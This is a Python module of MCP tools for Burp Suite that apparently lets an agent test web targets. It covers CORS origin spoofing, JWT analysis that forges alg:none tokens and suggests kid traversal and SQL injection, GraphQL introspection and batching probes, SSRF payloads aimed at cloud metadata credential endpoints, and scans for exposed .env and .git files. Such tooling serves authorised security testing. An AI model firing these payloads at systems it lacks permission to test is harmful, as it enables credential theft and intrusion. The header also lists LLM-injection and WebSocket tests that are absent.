"""Edge-case security testing tools — JWT, CORS, GraphQL, LLM injection, WebSocket, cloud metadata."""

import base64
import json

from mcp.server.fastmcp import FastMCP

from burpsuite_mcp import client


def register(mcp: FastMCP):

    @mcp.tool()
    async def test_cors(
        session: str,
        path: str = "/",
        test_origins: list[str] | None = None,
    ) -> str:
        """Test CORS configuration by sending requests with different Origin headers.
        Detects origin reflection, null origin bypass, wildcard+credentials misconfig.

        Args:
            session: Session name
            path: Endpoint path to test
            test_origins: Custom origins to test (default: evil.com, null, subdomain variants)
        """
        origins = test_origins or [
            "https://evil.com",
            "null",
            "https://evil.target.com",
            "https://target.com.evil.com",
        ]

        lines = [f"CORS Test: {path}\n"]
        vulns = []

        for origin in origins:
            headers = {"Origin": origin}
            resp = await client.post("/api/session/request", json={
                "session": session, "method": "GET", "path": path,
                "headers": headers,
            })
            if "error" in resp:
                lines.append(f"  [{origin}] Error: {resp['error']}")
                continue

            # Check response headers for CORS
            acao = ""
            acac = ""
            for h in resp.get("response_headers", []):
                if h["name"].lower() == "access-control-allow-origin":
                    acao = h["value"]
                if h["name"].lower() == "access-control-allow-credentials":
                    acac = h["value"]

            status = resp.get("status", "?")
            if acao:
                vuln = ""
                if acac.lower() == "true":
                    if acao == "*":
                        vuln = "CRITICAL: Wildcard + Credentials"
                        vulns.append(vuln)
                    elif origin in acao:
                        vuln = "CRITICAL: Origin reflected + Credentials"
                        vulns.append(vuln)
                    elif acao == "null":
                        vuln = "HIGH: Null origin + Credentials"
                        vulns.append(vuln)
                elif origin in acao:
                    vuln = "MEDIUM: Origin reflected (no credentials)"

                lines.append(f"  [{origin}] {status} -> ACAO: {acao}, ACAC: {acac} {vuln}")
            else:
                lines.append(f"  [{origin}] {status} -> No CORS headers")

        if vulns:
            lines.append(f"\n*** {len(vulns)} CORS vulnerabilities found ***")
        else:
            lines.append(f"\nNo CORS misconfigurations detected.")

        return "\n".join(lines)

    @mcp.tool()
    async def test_jwt(
        token: str,
    ) -> str:
        """Analyze a JWT token for vulnerabilities. Decodes header/payload,
        checks algorithm, identifies attack vectors.

        Args:
            token: The JWT token string (eyJ...)
        """
        parts = token.split(".")
        if len(parts) != 3:
            return f"Error: Invalid JWT format (expected 3 parts, got {len(parts)})"

        # Decode header and payload
        try:
            header_b64 = parts[0] + "=" * (4 - len(parts[0]) % 4)
            payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_b64))
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))
        except Exception as e:
            return f"Error decoding JWT: {e}"

        lines = ["JWT Analysis:\n"]
        lines.append(f"Header: {json.dumps(header, indent=2)}")
        lines.append(f"Payload: {json.dumps(payload, indent=2)}")

        alg = header.get("alg", "unknown")
        lines.append(f"\nAlgorithm: {alg}")

        # Check for vulnerabilities
        vulns = []

        # alg:none
        if alg.lower() in ("none", ""):
            vulns.append("CRITICAL: Algorithm is 'none' — token has no signature verification")

        # Weak algorithms
        if alg in ("HS256", "HS384", "HS512"):
            vulns.append(f"INFO: Symmetric algorithm ({alg}) — test with common secrets (secret, password, 123456)")
            # Generate alg:none token
            none_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
            none_token = f"{none_header}.{parts[1]}."
            vulns.append(f"TEST: Try alg:none bypass token: {none_token}")

        # RS256 → HS256 confusion
        if alg in ("RS256", "RS384", "RS512"):
            vulns.append(f"TEST: Algorithm confusion — try changing to HS256 and sign with public key")

        # JKU/X5U header injection
        if "jku" in header:
            vulns.append(f"HIGH: jku header present ({header['jku']}) — test with attacker-controlled URL")
        if "x5u" in header:
            vulns.append(f"HIGH: x5u header present ({header['x5u']}) — test with attacker-controlled URL")

        # KID injection
        if "kid" in header:
            vulns.append(f"TEST: kid parameter present ({header['kid']}) — test path traversal: ../../etc/passwd")
            vulns.append(f"TEST: kid SQLi: ' UNION SELECT 'key'--")

        # Check payload claims
        import time
        exp = payload.get("exp")
        if exp:
            if exp < time.time():
                vulns.append(f"INFO: Token expired (exp: {exp})")
            else:
                remaining = int(exp - time.time())
                vulns.append(f"INFO: Token expires in {remaining}s")

        if payload.get("admin") or payload.get("role") == "admin":
            vulns.append(f"INFO: Token has admin privileges — test with modified non-admin token")

        iss = payload.get("iss", "")
        if iss:
            vulns.append(f"INFO: Issuer: {iss}")

        if vulns:
            lines.append(f"\nVulnerability Assessment ({len(vulns)}):")
            for v in vulns:
                lines.append(f"  {v}")
        else:
            lines.append("\nNo obvious vulnerabilities in token structure.")

        return "\n".join(lines)

    @mcp.tool()
    async def test_graphql(
        session: str,
        path: str = "/graphql",
    ) -> str:
        """Test GraphQL endpoint for common vulnerabilities: introspection enabled,
        field suggestions, batch query support, depth limits.

        Args:
            session: Session name
            path: GraphQL endpoint path (default /graphql)
        """
        lines = [f"GraphQL Security Test: {path}\n"]
        vulns = []

        # Test 1: Introspection
        introspection_query = '{"query":"{__schema{types{name kind}}}"}'
        resp = await client.post("/api/session/request", json={
            "session": session, "method": "POST", "path": path,
            "headers": {"Content-Type": "application/json"},
            "body": introspection_query,
        })
        if "error" not in resp:
            body = resp.get("response_body", "")
            if "__schema" in body and "types" in body:
                vulns.append("HIGH: Introspection enabled — full schema exposed")
                lines.append(f"  [VULN] Introspection: ENABLED (schema leaked)")
            elif resp.get("status") == 200:
                lines.append(f"  [OK] Introspection: Disabled or filtered")
            else:
                lines.append(f"  [?] Introspection: Status {resp.get('status')}")
        else:
            lines.append(f"  [ERR] Introspection: {resp['error']}")

        # Test 2: Field suggestion leakage
        suggestion_query = '{"query":"{userss{id}}"}'
        resp2 = await client.post("/api/session/request", json={
            "session": session, "method": "POST", "path": path,
            "headers": {"Content-Type": "application/json"},
            "body": suggestion_query,
        })
        if "error" not in resp2:
            body2 = resp2.get("response_body", "")
            if "did you mean" in body2.lower() or "suggestion" in body2.lower():
                vulns.append("MEDIUM: Field suggestions enabled — schema can be enumerated via typos")
                lines.append(f"  [VULN] Field suggestions: LEAKING schema hints")
            else:
                lines.append(f"  [OK] Field suggestions: Not detected")

        # Test 3: Batch query support
        batch_query = '[{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"}]'
        resp3 = await client.post("/api/session/request", json={
            "session": session, "method": "POST", "path": path,
            "headers": {"Content-Type": "application/json"},
            "body": batch_query,
        })
        if "error" not in resp3:
            body3 = resp3.get("response_body", "")
            if body3.count("__typename") >= 2:
                vulns.append("MEDIUM: Batch queries accepted — potential DoS vector")
                lines.append(f"  [VULN] Batch queries: ACCEPTED (DoS risk)")
            else:
                lines.append(f"  [OK] Batch queries: Not supported or filtered")

        # Test 4: GET-based query (potential CSRF)
        resp4 = await client.post("/api/session/request", json={
            "session": session, "method": "GET",
            "path": f"{path}?query={{__typename}}",
        })
        if "error" not in resp4:
            body4 = resp4.get("response_body", "")
            if "__typename" in body4.lower() or "query" in body4.lower():
                vulns.append("LOW: GET-based queries accepted — potential CSRF")
                lines.append(f"  [VULN] GET queries: ACCEPTED (CSRF risk)")
            else:
                lines.append(f"  [OK] GET queries: Not accepted")

        if vulns:
            lines.append(f"\n*** {len(vulns)} GraphQL vulnerabilities found ***")
        else:
            lines.append(f"\nNo GraphQL vulnerabilities detected.")

        return "\n".join(lines)

    @mcp.tool()
    async def test_cloud_metadata(
        session: str,
        parameter: str = "url",
        path: str = "/",
        injection_point: str = "query",
    ) -> str:
        """Test for SSRF to cloud metadata services (AWS IMDSv1/v2, GCP, Azure, DigitalOcean).
        Sends SSRF payloads and checks for credential/metadata leakage.

        Args:
            session: Session name
            parameter: Parameter name to inject SSRF payload into
            path: Endpoint path
            injection_point: Where to inject — 'query' or 'body'
        """
        metadata_endpoints = [
            ("AWS IMDSv1", "http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "hostname"]),
            ("AWS IMDSv1 IAM", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", ["AccessKeyId", "SecretAccessKey"]),
            ("AWS Hex IP", "http://0xA9FEA9FE/latest/meta-data/", ["ami-id", "instance-id"]),
            ("AWS Decimal IP", "http://2852039166/latest/meta-data/", ["ami-id", "instance-id"]),
            ("GCP Metadata", "http://metadata.google.internal/computeMetadata/v1/", ["project-id", "instance"]),
            ("Azure Metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["compute", "network"]),
            ("DigitalOcean", "http://169.254.169.254/metadata/v1/", ["droplet_id", "hostname"]),
        ]

        lines = [f"Cloud Metadata SSRF Test: {parameter} on {path}\n"]
        vulns = []

        for name, url, indicators in metadata_endpoints:
            inject_path = f"{path}?{parameter}={url}" if injection_point == "query" else path
            req = {"session": session, "method": "GET", "path": inject_path}
            if injection_point == "body":
                req["method"] = "POST"
                req["data"] = f"{parameter}={url}"

            resp = await client.post("/api/session/request", json=req)
            if "error" in resp:
                lines.append(f"  [{name}] Error")
                continue

            body = resp.get("response_body", "")
            status = resp.get("status", 0)
            matched = [i for i in indicators if i.lower() in body.lower()]

            if matched:
                vulns.append(f"CRITICAL: {name} — metadata leaked ({', '.join(matched)})")
                lines.append(f"  [{name}] VULNERABLE — {', '.join(matched)} found in response")
            elif status == 200 and len(body) > 100:
                lines.append(f"  [{name}] Possible — 200 OK, {len(body)}B response (review manually)")
            else:
                lines.append(f"  [{name}] Not vulnerable ({status})")

        if vulns:
            lines.append(f"\n*** {len(vulns)} CLOUD METADATA LEAKS ***")
        else:
            lines.append(f"\nNo cloud metadata exposure detected.")

        return "\n".join(lines)

    @mcp.tool()
    async def discover_common_files(
        session: str,
        tech_specific: bool = True,
    ) -> str:
        """Probe for common sensitive files: .git, .env, backup files, config files.
        Auto-selects paths based on detected tech stack.

        Args:
            session: Session name
            tech_specific: If True, add tech-specific paths based on detected stack
        """
        # Universal paths
        paths = [
            "/.git/HEAD", "/.git/config", "/.env", "/.env.bak",
            "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
            "/.htaccess", "/.htpasswd",
            "/web.config", "/Web.config",
            "/package.json", "/composer.json",
            "/wp-config.php.bak", "/wp-config.php~",
            "/server-status", "/server-info",
            "/.svn/entries", "/.DS_Store",
            "/backup/", "/debug/", "/test/", "/admin/",
            "/phpinfo.php", "/info.php",
            "/elmah.axd", "/trace.axd",
            "/actuator", "/actuator/env", "/actuator/heapdump",
            "/console", "/__debug__/",
            "/swagger.json", "/api-docs", "/openapi.json",
        ]

        # Batch probe all paths
        endpoints = [{"method": "GET", "path": p} for p in paths]
        data = await client.post("/api/session/batch", json={
            "session": session, "endpoints": endpoints,
        })
        if "error" in data:
            return f"Error: {data['error']}"

        lines = [f"Common Files Scan: {len(paths)} paths tested\n"]
        found = []
        for r in data.get("results", []):
            status = r.get("status", 0)
            length = r.get("length", 0)
            path_tested = r.get("path", "?")
            if status == 200 and length > 0:
                found.append(r)
                lines.append(f"  [FOUND] {path_tested} -> {status} ({length}B)")
            elif status in (301, 302):
                lines.append(f"  [REDIR] {path_tested} -> {status}")
            elif status == 403:
                lines.append(f"  [DENY]  {path_tested} -> 403 (exists but blocked)")

        if found:
            lines.append(f"\n*** {len(found)} sensitive files/paths accessible ***")

            # Categorize findings
            for r in found:
                p = r.get("path", "")
                if ".git" in p:
                    lines.append(f"  CRITICAL: Git repository exposed ({p})")
                elif ".env" in p:
                    lines.append(f"  CRITICAL: Environment file exposed ({p})")
                elif "actuator" in p:
                    lines.append(f"  HIGH: Spring Actuator exposed ({p})")
                elif "phpinfo" in p or "info.php" in p:
                    lines.append(f"  HIGH: PHP info page exposed ({p})")
                elif "swagger" in p or "api-docs" in p or "openapi" in p:
                    lines.append(f"  MEDIUM: API documentation exposed ({p})")
                elif "debug" in p or "console" in p:
                    lines.append(f"  HIGH: Debug interface exposed ({p})")
        else:
            lines.append(f"\nNo sensitive files found.")

        return "\n".join(lines)
